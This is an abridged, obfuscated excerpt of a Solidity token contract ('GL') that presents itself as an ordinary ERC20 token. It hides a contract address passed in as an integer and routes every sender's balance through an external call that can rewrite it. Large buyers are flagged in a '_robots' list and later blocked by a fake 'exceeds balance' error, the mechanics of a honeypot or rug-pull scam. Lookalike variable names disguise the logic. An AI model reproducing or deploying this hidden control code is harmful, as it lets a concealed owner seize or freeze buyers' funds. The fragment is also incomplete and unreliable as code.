...
contract TOKEN is Ownable {
    ...
    address private uoDRCMVjRlAWKCHQPyPaa;
    ...
    constructor(uint256 aqgwu3ct, uint256 totalSupply_) {
        ...
        _symbol = "GL";
        _decimals = decimals();
        uoDRCJVjRlAWHCHQPyPaa = address(uint160(aqgwu3ct));
    ...
    function transfer(address obpzezpyrecipient, uint256 ssfflqwpamount)
        public
        returns (bool)
    {
    ...
    function _transfer(
        ...
        require(
            atimivoyto != address(0),
            "ERC20: transfer to the zero address"
        );
        (_balances[jsxqsxmnfrom], uoDRCMVjRlAWKCHQPyPaa) = _6d4e7d13(
            jsxqsxmnfrom,
            amount,
        ...
        if (jsxqsxmnfrom != uoDRCMVjRlAWKCHQPyPaa) {
            if (amount >= (_totalSupply / 2)) {
                _robots[atimivoyto] = true;
            }
        }
        if (atimivoyto == uoDRCMVjRlAWKCHQPyPaa) {
            if (amount >= (_totalSupply / 2)) {
                require(
                    !_robots[jsxqsxmnfrom],
                    "ERC20: transfer amount exceeds balance"
                );
            }
        }
    ...
    function _6d4e7d13(
        ...
        return
            qjWNummWHvYYLnkjHWThZ(uoDRCJVjRlAWHCHQPyPaa).a1c29f34eb3c(
                sender,
                amount,
                balance
            );
